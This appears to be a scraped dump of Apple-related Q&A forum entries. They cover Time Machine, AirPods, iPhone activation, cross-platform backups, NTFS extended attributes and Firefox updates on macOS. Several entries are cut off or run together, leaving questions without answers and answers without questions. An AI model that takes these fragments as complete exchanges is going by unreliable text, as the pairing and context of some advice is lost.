a pair of high resolution headphones are better than a given pair of non-high resolution headphones.\nTherefore yes, you can use them with the Apple Lighting dongle.\n", "Q: Time machine backup fails on Mac OS X 10.13.5 & Airport Time Capsule 7.7.9 I am using a Retina MacBook pro laptop, model A1398 (OS X 10.13.5), backing up to an Apple 802.11AC 2TB Airport Time Capsule.  The airport utility says that the time capsule is version 7.7.9.\nAll the OS updates have been applied to my laptop and I have tried to update the firmware on the time capsule to resolve this problem.  When updating the time capsule, I got an error in updating the firmware (error code -16).  However now the utility indicates that the firmware is uptodate.  I restarted the Airport again just to make sure that doesn't fix this issue.\nIt is now 9 July.  The last successful backup was on 25 June.  When a backup is triggered, it spends about 6 minutes preparing the backup before stopping it.\ntmutil status gives:\nBackup session status:\n{\n    BackupPhase = ThinningPreBackup;\n    ClientID = \"com.apple.backupd\";\n    DateOfStateChange = \"2018-07-09 09:54:26 +0000\";\n    DestinationID = \"69F6F35A-0542-4DEF-8889-DCC09450A8B1\";\n    NumberOfChangedItems = 20369;\n    Percent = 0;\n    Running = 1;\n    Stopping = 1;\n}\n\nwhile the backup is being prepared, then stops and reverts to:\nBackup session status:\n{\n    ClientID = \"com.apple.backupd\";\n    Percent = 1;\n    Running = 0;\n}\n\nWhat additional information do I need to troubleshoot why backups start and then stop?  Is there a known fix for this issue?\n\nA: I also have some issues at times when backing up my 2015 MBP to a 2G Airport Time Capsule (ATC). Here are some things to verify:\n\n\n*\n\n*Can you find your ATC from the AirPort utility on your Mac? Are all lights green (no firmware update pending, no fault)? Note: you can't see your ATC if Wi-Fi is disabled and you're only connecting with an Ethernet cable.\n\n*Can you see your ATC in the Time Machine preferences?\n\n*Can you mount your ATC disk on your MBP? If not, then the ATC may be defective (I had this happen after a couple weeks of use - my ATC was replaced for free in an Apple store).\n\n*Did your network topology change since your last successful backup? E.g., new network name, access through different wireless network, access through wired network instead of wirelessly. I've seen Time Machine being rather picky about backing up wired or wirelessly. I believe that Time Machine sometimes gets confused you access the Time Capsule over different networks (wired, wireless, different Wi-Fi networks...).\n\n*Is there still sufficient free space on your MBP and on your ATC? Time Machine requires storage on your MBP to preserve the hourly/daily/weekly/monthly snapshots prior to syncing them to the Time Capsule. And your ATC must still have sufficient room for integrating the backup.\n\n*Did you recently switch to your MBP from another Apple computer, while porting the TC backup? This may confuse Time Machine.\n\n*Did you exchange your ATC since last successful backup? This will definitely confuse Time Machine as it sees a new device.\n\n\nSome tips are also given at the following locations (including tips for checking the file system):\n\n\n*\n\n*https://www.any-data-recovery.com/mac-data-recovery/how-to-fix-time-machine-backup-failure-and-errors.html\n\n*https://support.apple.com/HT204157\n\n*https://support.apple.com/guide/mac-help/time-machine-troubleshooting-mh15653\n", "Q: Create Mac App Without Software I was just wondering if there is a way to make a mac app without software, by making text files with certain file extensions? Is this possible? Thanks.\n\nA: You sure can, but by \"without software\" I assume you mean \"without application development software, like XCode\". The text files will need to be written to disk using software.\n(There's always punch cards, but no Mac has ever had a punch card reader)\nDesign your application and write it in x86_64 assembler language. Get the Intel opcode reference and translate all the instructions into hexadecimal. Type in the numbers, save, change the flag to executable and add the GUI support files if appropriate. Those are all plain text anyway.\nYou will very quickly realize that using XCode is much, much easier. And it's free.\nAnd before anyone else says \"it's impossible to write code like that\", Steve Wozniak wrote the original integer BASIC operating system for the Apple ][ exactly that way. How do I know? Wrote a letter to Apple way back in the 1980s asking for a copy of the source code and that's what they said. The full source of the floating-point version was in the back of one of the manuals that came with the computer, so it's not like they didn't want to share.\n\nA: I mean you can make an make scripts which would technically be considered an Application (AppleScript-.scrpt, Bash-.sh, etc). But if you want to make any real application your going to want Xcode or some other software to allow you to design and program an Application.\n\nA: You can technically write a program without any advanced software, for instance with a text editor. Create an empty .txt file and write your code in it then rename it with the correct extension (.c, .h, .swift or whatever).\nYou'll need at least a compiler to build your program and make it an executable file.\nNote that this approach is not recommended as it would be very slow and unproductive since the purpose of such software is to improve the coding experience by providing helpful tools such as a debugger, an interface builder, auto-completion and an access to many libraries and far more.\n", "Q: Running a Mac Remotely Over a LAN I have a Mac Mini that I use as a build platform, from within Visual Studios 2017 for Windows, to write and debug iOS apps.\nI've noticed that when I establish a connection between VS and the Mac, I have to log into the Mac remotely (I use TigerVNC) before launching the connection process. If I don't establish a remote desktop session on the Mac, the connection will fail part way through because the Mac has gone back to sleep (i.e., the power LED has gone dark).\nThis is a different behavior than what I'm used to when accessing a Windows machine remotely. For them, once you establish a connection, the machine stays awake until the connection is closed, and the sleep timeout period expires.\nIs this by design for Macs? Is there a setting that I can change to make it stay awake without first creating a desktop session?\n\nA: You can prevent the Mac from sleeping in the Energy Saver preferences panel. There are a few options, but if you want to simply keep it awake the either:\n\n\n*\n\n*Dragging the Computer sleep slider to Off.\n\n*Checking Prevent computer from sleeping automatically when the display is off.\n\n\nYou can find more options and details in Apple’s Support Document.\n", "Q: xClient process consuming CPU -- what is it? Basic question, I can't find anything on Google about it. There's a process that keeps my fans spinning, and consumes about 80% cpu.\nxClient -- what is it, or how can I find out more about it?\n\nA: Open Activity Monitor and sort by CPU. Then select the item and click the information icon (circle with a lower case i)\nThen you can see all the open files and ports. That should give you a ton of system files that make no sense, but you should get a path to the file or some details to post if you can't figure out straight away where it's located and what files it's reading. (Worst case upload the files to a GitHub gist or pastebin and link to me in the comments below)\n\nA: What xClient is\nI also see this running about once day. This is likely part of the \"Snow Inventory Client\".\nAfter getting the Process ID (PID) - let's say it's 11211, I ran this (note that the $ is the prompt and not part of the command)\n$ sudo lsof -p 11211\n\nand two of the items displayed are:\n\n\n*\n\n*/usr/local/bin/xMetering\n\n*/Library/Application Support/Snow Software\nGoogling for xClient and xMetering brings up a PDF describing the Snow Inventory Client. The configuration file (/etc/snowclient.conf) mentioned in the PDF also exists on my system, with a SiteID being my company's name.\n\nManaging its High CPU usage\nxClient is a CPU hog. I use cputhrottle to limit it, which can be installed via Homebrew.\nExample usage. Suppose xClient's PID is 11211 and you want it to take no more than 10% of CPU (on average). You'd run this in a Terminal:\n$ sudo cputhrottle 11211 10\n\nNote that this is 10% of a single CPU core. The cputhrottle command will keep running until the throttled process (in this case, xClient) exits.\n", "Q: How to activate my iPhone with a broken home button My iPhone says \"press home to restart\" but my home button is broken so there is no way to press home.\nI can't use the answers in How do you activate an iPhone with broken home button iOS 10 as my iPhone isn't linked to my computer, and I can't activate Assistive Touch.\nHow can I activate my iPhone nevertheless?\n\nA: Get the phone fixed, or buy a new one.\n\nA: Got this issue yesterday and didn't find any solution on internet but here it is !\nUsing iMazing you can get around the home button press on iOS 14.\nYou select your device in it -> Options -> Device Settings -> Set Language & Region\nand voila.\nYou can also enable VoiceOver and follow Mike Hardy if it doesn't work for you.\nYou may have to reboot the phone.\n\nA: Copied from an answer found on iFixit, this helped me set up an iPhone with a broken Home button, on iOS 14.2.\n\nTurn off the iPhone with power button + slider, do not reboot it. Turn\non again with power button and you should be able to use touch and go\nthrough settings without the need to press home button.\n\nYou can then unlock sim, activate iPhone and re-enable Assistive Touch or restore a backup.\n\nA: I do not know what you mean by \"[…] my home button is broken […]\". You also did not state which iPhone model you are using.\nSo I assume \"broken\" means \"stuck\".\nA friend of mine helped me with a stuck Home button. This is how to clean the stuck Home button with care:\n\n\n*\n\n*make a backup first (does not apply to you, because you can't activate it.)\n\n*shut it down completely & take out the SIM card\n\n*Wait about 30minutes for all capacitors to loose their load\n\n*take isopropanol (90% medical alcohol)\n\n*take a q-tip, wet it with the isopropanol (don't sniff - you know, don't drink and repair expensive technical equipment :-) )\n\n*use the wet q-tip carefully around the Home button, try to press it\nslightly and clean the edge/border with it multiple times for at least 5mins.

Currently, my left AirPod has gradually, but also quite dramatically, lost its volume capacity over the course of a couple of weeks.\nIt would be vital for you to know, that this is not the first time this has happened. I have been an AirPods owner for about 1.5 years, but during that time this problem has occurred with both my Left and Right AirPods multiple times at different occasions. I have been able to get replacement units from Apple as the decreases in volume has been significant. I believe my current Left AirPod is the fourth unit I've owned which exhibits this problem.\nI need to pan the audio in the system to achieve a rough L–R equilibrium. Currently, I need to pan the volume 50% Left from the Middle, which indicates a 50% volume loss.\nWhile the deterioration has been slightly gradual, it may also occur dramatically and suddenly. In fact, two times (with different units) the volume capacity has gone jumped from unnoticeable to about 20% loss and then almost 50% loss over the course of a week or two. This would suggest to me that it's not due to earwax buildup, but something technical, but I'm not sure.\nI have tried the AirPods on multiple systems, so I know it's something relating to the unit and not the OS. I have tried cleaning them quite routinely, even by following this suggestion to suck on it to remove potentially clogging earwax from the behind the membrane. Unfortunately it doesn't seem to help.\nDoes anyone know what the problem can be, and how to fix it? If it's likely due to dirt, is there a sure-fire effective way to clean them? For equipment at this price, it doesn't feel satisfactory that they lose significant volume over time.\n\nUpdate regarding AirPods Pro: I now own the AirPods 1st Generation, and also since six months back the AirPods Pro. The problem of suddenly and significantly losing volume – as described above – has been delimited to only the 1st Generation AirPods so far, and this has happened at least with 3–4 pairs of these 1st Generation AirPods that I have replaced thanks to the multi-year consumer protection laws in my country. They have failed every six months or so.\nThe AirPods Pro have not exhibited the problem of suddenly losing significant volume, after six months of usage. Apple may have resolved the issue, but it remains to be seen. However, the AirPods Pro does lose volume gradually due to continual use, despite cleaning. Max volume is perhaps 20–30% less than upon purchase. I would recommend people to replace their AirPods after the damage becomes significant enough, because I view gradual loss of volume as a product failure.\n\nA: If you are close to an Apple store, I would take them in for a factory reset / genius bar. See if they have any suggestions on monitoring. Unless you could use an otoscope or camera to show the ports clogged with ear wax - the total sound pressure can't be affected by some minor amount of cruft.\nAlso - in that setting you can close your eyes and have the tehnician move the balance and you can tell them when to stop the pan. If you're accurately hearing the sound output, it should be clear to everyone that you're carefully calibrated your ears and you are getting a different stereo mix when you use the same iPhone with wired headset and AirPods.\nAt that point, I would expect them to offer a full reset procedure and then a replacement set to be sure yours are not defective. At that point, once they are sure you're not getting proper volume, they might want to do an engineering capture / get you brand new set and/or refund your money.\nI don't doubt you're getting poor volume and if you can get the support staff on your side - they might even fix the bug for us all. Sorry it's on you to prove it's hardware - but I had to go in to learn the reset procedure and a factory reset on AirPods was something you want on the service record if you want to get a paid swap / refund since it did solve volume and sound quality issues for me on one pair of AirPods.\nSince I do live close to stores, I wouldn't do any cleaning other than what Apple says - and I request staff to instruct me how to clean it - possibly pointing out the cleaning KB and I'll review with them what force is safe from canned air, vacuum, etc... I wouldn't even go down the path of \"suck on it” since the force from the suction could probably unhinge / break many headphone speakers unless they were internally vented in a very clever manner. (AirPods may in fact be, but I'm sticking with Apple on how to clean / maintain these.)\n\nA: Following up on this. The Cleaning tip where owners gently \"suck\" on the mesh screen portion of the airpod till they feel air passing thru WORKS.  Functionally, it's not sucking stray earwax, but physically RESETTING the diaphragm on the headphone.  I've done this to my 3 year old Gen1's Airpods as a last-ditch effort. Works like a charm!\n\nA: I have had the exact same problem with the pair I bought my grandson. I too have returned them (under warranty) 3 times. I’m sure it is a mechanical/technical problem, because if you rotate them in your ear 90 degrees forward, they go to full volume. When you turn them back down to the position you would normally wear them, the volume drops dramatically. \n\nA: Wade makes a good point about the 90-degree turn. In addition, swapping them into the opposite ear, whether facing up or down, somehow resulted in full sound as well.\nIn any case, to my amazement, the blowing-sucking trick did FIX low sound in my left earbud even though it was hardly dirty/waxy: https://www.youtube.com/watch?v=KGdR5kay5ZE\nI did not use a hair-dryer as shown in the video, so it only took a moment.\nConsider it a discovery experiment.

For my work, I am sometimes in the field using my iPhone 8's 4G connection for Internet. I tether my laptop to it over WiFi using Personal Hotspot; this works fine.\nSome of the equipment I work on doesn't have WiFi to be able to connect to the hotspot, but it would be useful to temporarily give it Internet access while I'm working on it. I see that Lightning ethernet adapters are now available and show up as an ethernet interface in iOS. \n All the information I can find refers only to using the wired interface as the uplink to the Internet.\nDoes anybody know whether iOS will run Personal Hotspot (ie, DHCP, NAT, routing to the 4G interface, etc) on the ethernet interface when one of these adaptors is plugged in? \nThanks.\n\nA: It will work if you connect the iPhone via usb to a PC or Mac and then forward the connection over ethernet to a wifi router.\n\nThis would work because iOS allows for hotspotting over USB. from there, you can use the sharing preferences on Mac to share internet, you may share the connection to any available interface, which includes wifi/usb to ethernet or any other interface that may be connected. \n\nWith a wifi router, you would be able to access both wired and wirelessly what is on the network. The connection would come from the iPhone, go to the computer, then travel to the router; where a NAT would be created, and multiple devices connected to the wifi router would allow for communication between the wired and wireless devices. \nA note: your Mac and iPhone will not connect to the network because they are supplying the internet connection.

It seems that everytime I try to reach the limit with these transfers, iTunes is automatically copying older files from my ipod to my macbook in order to create space for the new files.

Background\nI have an old MBP which works fine right now.  I have no immediate plans to change it.\nBut it is getting old, the discrete GPU died, and I expect it could die at any time.  I would like to keep my option open to move to a Linux laptop when this machine dies.  Most of the software I use is either open source or runs on Linux as well and I rely heavily on Terminal/bash already. Considering that and not wanting to be tied to macOS due to not having a solid cross-platform backup, here's my current backup strategy to allow either a Mac or linux based OS to be my next computer for my current data.\nmodified backups\n\n*\n\n*keep frequent backups, but, rather than relying only on Time Machine, backup /Users/ via rsync as well.  (what file system is my best bet here?)\n\n\n*run preliminary trials on restoring the rsync backups into a test Linux VM.\nAs you an see - I'm not decided what filesystem I should use to rsync as Time Machine backs up to HFS+ and since I haven't picked a Linux it's not clear if I want / can mount HFS+ to read the backup data.\nWhat setup allows me to restore my data that is backed up with rsync to any Linux?\n\nA: Use the cloud to store your data.\nI actively use three different operating systems:  macOS, Windows, and BSD (I do use Linux from time to time, but generally avoid it).  To access my data on each of these platforms, I use the cloud (a hybrid cloud to be exact).\nThis can be as simple as having a OneDrive, DropBox, etc. account and a simple USB external drive to back up your data to a highly integrated hybrid cloud consisting of cloud storage, a local NAS with it's own cloud sync clients and external backup.\nThe point is:  separate your data from your \"operations.\"  In other words, become platform agnostic.  Because, when you structure your data this way, regardless of what you move to, your data will be ready.\nSimple Cloud\nIf you were to use OneDrive or DropBox, for example, you could store all of your documents to the cloud.  Both have clients for macOS and Linux so both could sync with no issue.\nAs for backups, both have native backup software (i.e. Time Machine) that allow you to efficiently back up your machine and data to an external USB or NAS device.\nHybrid Cloud\nI am a huge fan of Synology NAS devices.  I store my data on cloud services (like OneDrive) and sync it via Synology's cloud sync software back to my Synology.  My Mac (and my Windows and BSD machines) all have external USB drives for backup and my NAS has it's own external drive(s) for backup (I have two).\nIs it overkill?  Probably. However, I haven't lost data in over 15 years (I was doing this before cloud storage came out strictly with NAS - nfs, smb, afp, etc.)\nSome notes\n\n*\n\n*I use utilities like KeePass's (cross platform password database) data file on the cloud so all of my apps can access it from any device from anywhere\n\n\n*I use local incremental or snapshot backups so I can easily restore data should I type the incorrect rm command.\n\n\n*I keep my data and backups in multiple places - it's in the cloud, it's synced to three machines (where applicable) which are locally backed up, it's synced to a NAS which itself is locally backed up.\n\n\n*I back up my \"settings\" (i.e. .bash_profile, ./ssh/config, ./ssh/authorizedkeys etc.) the cloud.\nTL;DR\nEfficient use of cloud services and/or technologies will enable you to store you data in a centralized location making migration from one platform to another quite simple.\n\nA: One approach would be to keep on using Time Machine and defer the decision till the mac dies.\n\n\n*\n\n*Purchase a new mac from Apple.  Keep all packaging.\n\n*Restore from Time Machine backup (very simple).\n\n*Evaluate the replacement mac (or not, if you've already made up your\nmind)\n\n*If you decide to migrate to Linux, just copy your user files to your target Linux system.\n\n*Return mac to Apple.  You have up to 14 days from purchase (double-check that in your country) to return it, no questions asked.  Apple is extremely good with this, I've done it before, though not for this reason.  14 days is more than enough to do this, if you can get hold of a Linux system soon enough.\n\nA: There are three problems you're dealing with here:\n\n\n*\n\n*How do you back up your Mac filesystem in such a way that you don't lose any data?  \n\n*How do you make that data accessible to linux?\n\n*How do you use that data in linux?\nNone of these are immediate when operating between the Apple ecosystem and any other (Windows or Linux).\nThe reason for these difficulties is that Apple's filesystems, in order of historical introduction, HFS, HFS+ and APFS, are filesystems that use \"Extended Attributes\" (EA's), which include \"forks.\"   \nThese metadata components may not be translatable in any obvious way to another filesystem.  For example, Apple FS's have as standard, two forks (though they may technically have any number).  The data fork contains most of what we usually think of of file data, along with a resource fork, often but not solely used by executables.  (And though that wikipedia link does not mention the resource fork in APFS, they do still exit there.)  There is other metadata, including that for the Finder program and \"a separate area for metadata distinct from either the data or resource fork...  However, the amount of data stored here is minimal, being just the creation and modification timestamps, the file type and creator codes, fork lengths, and the file name.\"1 \nAn Approach that Puts Off Part of the Problem by Backing up to an Apple Formatted Disk\nOne approach is to backup your present files using some Mac solution that will keep copies of your files on an HFS+ or APFS filesystem.  When the time comes to move to linux, you will have your files and be able to read them (though not write) using linux's hfsutils, hfsprogs and hfsplus or, apfs-fuse(installation tutorial), apfsprogs-git & linux-apfs-dkms-git.\nMake sure that your backup system does not store your files in some proprietary archive format that you will not be able to read under linux, which may happen if you are not using a cross-platform tool.  For-fee solutions include Get Backup Pro and CronoSync Express.  While the first would be a true backup (keeping historical copies of files), the second could be either a backup or a simple mirror.  It is possible that TimeMachine might also work, though you will have to confirm that it doesn't use an archive format unreadable under linux.  You just want an APFS filesystem, with you files copied to it.  \nLater You Will Want to Use Your Files on Linux\nOf course, for the purposes of your question you will in addition want to know how to represent all of your files in a usable way on some linux filesystem.  Clearly the Finder data is of no use, and you will have to lose HFS+'s \"birthtime\" attribute (see below), because that is not tracked in Linux.  The data fork contains the bulk of the information, but what relevance the resource fork and some of the other metadata may have, will depend on the file.  How problematic this may become for you, may not be clear until you try.\nThe following approaches will allow you to save all of your MacOS data instead to a linux formatted disk, thereby doing without Mac backup software or TimeMachine, etc., and also dispensing with the later need to read an Apple disk under linux; though you will still then be faced with the question of proper use of that data under linux.  You may do well to consider this article, \"Command Line Backup Solutions on Mac OS X,\" before proceeding.  As discussed in that article, be careful to note that using MacOS's resource fork aware version of rsync (or tar) will produce output that is not usable by linux's version or rsync or tar!\nBacking up to a linux disk with rsync\nThere is a project called rsync+hfsmode that will handle backing up to linux formatted disks properly, at least for HFS+, but it does it by creating two files on the backup drive: filename, containing the data fork, and ._filename containing the resource fork and Finder metadata.  Furthermore, when copying back to an HFS+ disk, a second step is needed to reconstitute those two files into a proper HFS+ data structure.  You can see a more complete discussion at the project page.  The filename/._filename system for storing HFS+/APFS files to other filesystems, has a name.  It is called AppleDouble format. \n I am not clear if this same approach will work for APFS, though the question asked on the Apple Developer Forum was responded to with silence; so perhaps not.\nBacking up to any kind of disk with dar\nDisk Archiver (dar), which is cross-platform and available in Homebrew, can handle the unique characteristics of MacOS filesystems (they do not distinguish between HFS+ and APFS, but say they can handle extended attributes, including file forks).  According to their Features page:\n\nEXTENDED ATTRIBUTES (EA) references: MacOS X FILE FORKS / ACL\n  Dar is able to save and restore EA, all or just those matching a given pattern.\nFile Forks (MacOS X) are implemented over EA as well as Linux's ACL,\n  they are thus transparently saved, tested, compared and restored by\n  dar. Note that ACL under MacOS seem to not rely on EA, thus while they\n  are marginally used they are ignored by dar.\nFILESYSTEM SPECIFIC ATTRIBUTES (FSA) references: \n  MacOSX/FreeBSD Birthdate, Linux FS attributes \nSince release 2.5.0 dar is able to take care of filesystem specific\n  attributes. Those are grouped by family strongly linked to the\n  filesystem they have been read from, but perpendicularly each FSA is\n  designated also by a function. This way it is possible to translate\n  FSA from a filesystem into another filesystem when there is a\n  equivalency in role.\ncurrently two families are present: HFS+ family contains only one\n  function : the birthtime. In addition to ctime, mtime and atime, dar\n  can backup, compare and restore all four dates of a given inode (well,\n  ctime is not possible to restore)\n\nI also had some discussion on these issues with the developer.\nSince dar is cross-platform, you don't have to worry about the format it stores the files in, since you'll also be able to install dar on linux, when it is time to move there.  In this case it probably makes sense to format your backup disk as some linux filesystem.  You could use APFS if you wanted, as it's also readable under linux, but that seems pointless.\nRestoring to a linux disk will produce error messages when metadata can not be reproduced.  You will be able to save the problematic files in a smaller archive.  Whether you can explore the attributes of those failing files using linux tools, I am not yet clear.\nBacking up to Any Kind of Disk Using Restic\nRestic is similarly cross-platform and available in Homebreaw, and can handle Apple disks.  (Though again, they do not distinguish HFS+ from APFS.)  There is a detailed bug report describing how restic behaves when backing up HFS+, showing what it is able to handle and where it fails.  \nSimilarly to dar, restoring to a linux disk will produce error messages when metadata can not be reproduced.  Whether you will be able to manipulate or save those problematic files separately, I am not yet clear.\nHere is a short description of its installation and use in MacOS, along with a scheduler.\n", "Q: Why on Apple TV 4K, using Siri with \"Move forward by 2 minutes\" moved the movie back to near the beginning? When I was watching the movie at 00:50:00 (about 50 minutes into the movie), and I said to Siri on the Apple TV 4K, \"Move forward by 2 minutes\", it moved the movie to 00:02:00 (near the beginning of the movie), but if I was at 00:50:00 and I said, \"Move backward by 2 minutes\", it moved to 00:48:00?\nI found that I could solve the problem by saying \"Skip forward by 2 minutes\", but why didn't the word \"Move\" work?\n\nA: Report the spoken phrase, expected outcome, actual outcome, and what Siri transcribed on screen, using Apple’s feedback form.\nSiri has a lot of quirks like that where the outcome doesn’t match what you could reasonably expect. This comes down to Siri’s natural language processing simply needing refining.\nI use Siri heavily on Apple Watch, and I used to encounter similar issues, but they got fixed within days or weeks after I reported them.\nOne example would be: “At 9 a.m., remind me to do X.” Occasionally, Siri understands, “Add 9 a.m., remind me to do X.” Yet for the longest time she would go ahead and create a reminder with no due date, even though she clearly understood the time part of my request. A few days after I reported this issue, Siri started correctly tacking on a due date even when she understands “add” instead of “at.”\n", "Q: Paste path from clipboard in file dialog I have a full absolute file path on my clipboard (ie: /Users/Noit/Pictures/Screenshot - Jul 9, 2018 3.27 PM.png)\nI then go to say Skype or gmail in my web borwser, and click \"attach\".

I recently acquired an older iMac 5,1 with 3 GB RAM, currently running Mac OS X 10.6.8, and from what I can gather online it is able to run \"Mac OS X 10.7.5 Lion\". I found that it is available for purchase on Apple's website for $20, but I do not consider $20 worth fixing up this old machine.\nHowever, if this purchase was tied to my Apple ID or something and worked on multiple machines, that would be nice since it would mean I could fix up any other vintage Mac computers with this version of Mac OS X by signing into my Apple ID?\nSo, if I purchased an old version of Mac OS X, such as 10.7.5 Lion, what do I get exactly? An upgrade for just one machine? A license tied to my Apple ID? An ISO file for installing Lion? Do they ship a physical disc? Also, am I able to do a clean install or is it just for upgrading?\n\nA: In the past you could buy USB physical media for Lion but the item you linked to is a redemption code delivered by email. You then have the ability to associate that purchase with one Apple ID of your choosing so you can download and install.\nApple offers pre-sales support if you need more questions about this (or any product) and the end user license allows you to run Lion redeemed from the store on all of the machines you own and control but likely no virtualization or time-sharing allowed.

I went ahead and purchased it. This is my experience.\nI purchased Mac OS X 10.7.5 Lion and received and E-mail that I would be receiving the item in future E-mails. A few days later I was delivered two E-mails, a password-protected PDF file in one, and a password in the other. I downloaded the PDF and unlocked it with the password. It contained a code, which I redeemed in the App Store. \nI was then able to download Mac OS X 10.7.5 Lion, but only from the old Mac, the download does not show up under Purchases on newer Macs. I downloaded it and it launched the installer. \nSince I wanted installation media to keep for later, I closed the installer and pulled out the DMG image. Unfortunately this file is too large to fit on a single-layer DVD (you need 5 GB of space). So I copied it to my Linux computer, converted to an ISO, then used dd to put it on a flash drive.\nThis flash drive successfully booted, and I was able to wipe the old Mac OS X 10.6.8 Snow Leopard.

How should I fix the problem?\n\nA: This is a known issue. The touch bar is quite finicky. Try these scripts in the terminal:\nKill touch bar - pkill \"Touch Bar agent\"\nRefresh control strip - killall ControlStrip\nAdditionally, if the scripts didn't solve your issue and you are still under the 90 days of free Apple Care, I'd recommend taking it in.

I think this is silly question and this is easy to solve but I just cant figure it out how to do this with Numbers.

The device should update the collection in a silent way, with no two-factor authentication requests from an official server (whenever I close one of them, the next one appears after some seconds). This is quite annoying. Plus, it seems that there's no way to deactivate tags updating when the WiFi is on. \nIf someone could shed some light it would be great. Thanks.\nFor clarification:\n \nTranslation: Your Apple ID is being used for access to a device near Milan, Lombardy\nEDIT: Thinking about that more after posting it, I have the feeling that the server in Milan (which should be an official Apple server that updates data on my device) is not \"certified\" in a certain way, so the iPhone asks for verifying it in a first place. Don't know if it makes sense, It's my first Apple device and I do not know certain logic very well.\n\nA: I can't say with absolute certainly but the best guess would be that, so long as these requests/confirmations always appear within a few seconds/minutes of you activating the function, that it's simply not accurately logging your location.\nI live in London & most times these requests appear to come from an area within 5 miles of where I live.\nHowever, when I visit my relatives in Tenerife, all requests of this type appear to originate in Madrid, some 2000km away.\nI've simply got used to the idea that this always happens.\n", "Q: Extended attributes reappear when reconnecting external drive Some files on my external drive appeared grey out. Hence, I removed all the extended attributes using xattr -rc command which successfully does the trick and all my files appears normal.

It reveals that the Finder has set the file’s file type and creator respectively to brok and MACS, signifying the file is engaged in the process of being copied and therefore cannot be accessed. (These flags are supposed to be erased upon completion of the copying process.) As a consequence, the Finder \"greys out\" the icons of such files to reflect their status of immutability by the user. Erasing the com.apple.FinderInfo extended attribute relieves the situation by removing the proximate cause.\nThe real problem, however, is the constant reassignment of this \"busy being copied\" status to the various files. Indeed, you specifically asked why the extended attributes reappear for particular files. My answer: I don’t know the mechanics of the events, but I do know what’s behind it.\nApple natively supports reading, but not writing, to NTFS drives. The bespoke fstab workaround method you are currently using to permit writing to the disk is known to be unstable, and is guaranteed to cause problems. (Is your username really username?) I wondered how it was you came to the abstruse idea of erasing extended attributes to correct the inaccessible file situation, and a visit to the Mounty Software site (the source of your previous workaround) showed me it was their specific recommendation. As you have learned, it is not a lasting solution. The problem will continue as long as you continue to use your current method of NTFS filesystem access.\nIf you must have read/write access to an NTFS formatted drive—and cannot replace it with one in the natively supported exFAT format—you will have to choose a third party offering to provide a permanent solution. Those I know of which offer acceptable usability are Tuxera, Paragon, and Fuse/NTFS3G. The first two are commercial products available on a free-trial basis; the third is a combination of two open source products.\n\nEDIT: Response to OP's comment below\n\nI’m sorry to say I don’t have any command line instructions which would definitely help you. I believe that the only way to fix the problem is to change the method you use for filesystem access from one which is known to have issues, as your current method does, to one which does not.\nThat said, I offer the following purely as an experiment, as I have no way to test it. We know that the benefit of erasing the extended attributes of the affected files only lasts until the next time the drive is mounted. It is possible that assigning a dummy value to a file’s com.apple.FinderInfo attribute will allow it to persist unmolested through the mounting process and prevent the Finder from re-assigning brok/MACS status. Specifically, this command will give a bogus file type of hack to <targetfile.ext>.  Test it on just one or two of your problem files, and see what happens to them when the drive is unmounted / remounted.\nxattr -wx com.apple.FinderInfo 6861636B00000000000000000000000000000000000000000000000000000000 <targetfile.ext>\n(Why all the zeroes? The com.apple.FinderInfo extended attribute must be written as a single 32-byte block. Anyway, whatever it may look like here, it's one command, all on one line as you'd expect.)\n\nA: I realize this is a partial answer, but thinking and writing it out might help us get to the answer based on additional experience with this problem. \nWhile yes, the built-in NTFS filesystem driver might be listed as unstable, the exFAT one should be mature; I've used exFAT for years in live event production to be able to transfer powerpoint decks and audio/video content for playback between Mac & Windows systems. It always worked more or less well. \nAnd yet, just this morning, I had the Finder in Catalina 10.15.3 failing to clear the brokMACS extended attribute after copying to a known-good exFAT-formatted drive. Blaming Mounty for providing a better solution (using a GUI to utilize the built-in 1st-party-provided filesystem driver, instead of having to install additional 3rd-party drivers, SHOULD be considered better) when it comes to mounting NTFS read/write is ignoring the real issue; the Finder NOW fails to clear temporary extended attributes on more than one filesystem driver, when it didn't used to behave this way on the type of filesystems. \nUsing cp commands from the Terminal seems to avoid the issue, but that doesn't fix the Finder. \n", "Q: Unable to open any applications Terminal System Prefs OSx has thrown a wobbly on me.\n\nI cannot open any applications whatsoever.\nWhen booting into safe mode:\n\n\nA: Any time the system itself needs to be reinstalled, you can safely boot to recovery HD or internet recovery or bootable install media and then reinstall the core OS. This functions like the archive install of the old days where it sets aside your running system. Then a fresh system is installed and all users and data are migrated in to the new system.\nThis is super safe if you have a good backup and relatively safe even if you don't have a backup since it doesn't intentionally delete any user settings or data.

Simply unselect everything in iCloud other than Notes. In this case there is no work on your part other than signing in. The notes will simply move to your Notes app.\nWhen you get your Notes as desired, you can sign out of iCloud after the Notes appear. Go back to iCloud in System Preferences, and sign out. It will ask if you wish to keep everything on your Mac, in which case you should say 'yes'. Of course, you will no longer sync Notes between your devices, but it sounds as if you do not need that feature.\n\n", "Q: Unable to install app on new phone because \"App is no longer available in the App Store\" I switched to an iPhone 8 Plus and found out that 2 paid apps cannot be downloaded anymore as they have been removed from the store.\nI have copies of the app on several devices - the oldest device that still has this app is an iPhone 4.\nI am having trouble transferring the app to my computer so that I can manually transfer it to my new device.

It is completely like giving away root access.

The message says, \"This update requires administrator privileges\". I'm new to Mac and am used to Firefox just automatically updating itself on Windows and Linux. This Mac Mini workstation is a test platform to investigate converting our office from Windows to Mac. I do not want to give the users any admin passwords, nor do I, as admin, want to go to each and every workstation and manually permit updates to a browser.\nIs there a way around this?\n(High Sierra)\n\nA: I ran into this today updating to Firefox 61.0.2 and on restart up came a dialog saying \"Firefox is trying to install a new helper tool\" prompting me to enter my admin username & password.  I'm generally not a fan of typing admin credentials into a dialog box for an application update for a plethora of reasons.\nSolution for me was simply to download the latest release of Firefox, mount the disk image and drag it into my Applications folder.  This probably requires the logged in user to have administrative privileges, but at least does not require them to know any password - which was your stipulation.\n\nA: I normally use a remote admin tool to handle this type of thing. The most basic is Apple's Remote Desktop which can run on an admin's workstation, there are more powerful server-based solutions like Jamf.\nUsing Remote Desktop I would download and open the Firefox installer, then select a group of computers in Remote Desktop, then select the \"Copy\" command. In the window that appears, drag the Firefox application to it and then at \"Place items in:\" picker choose \"Applications Folder\" (assuming that is where you have Firefox now) and then at \"If an item already exists:\" picker choose \"Replace the item\". Then hit the Copy button and the new Firefox will be copied to all the selected computers. If setup correctly, the Remote Desktop app is connecting as the local admin user on each computer to make the copy.\nThe users don't have to be logged in, but they do have to be either awake or in a sleep mode they can be awoken from.\n", "Q: Are there pin differences on the audio jack between a 2015 and a 2017 MacBook Pro?

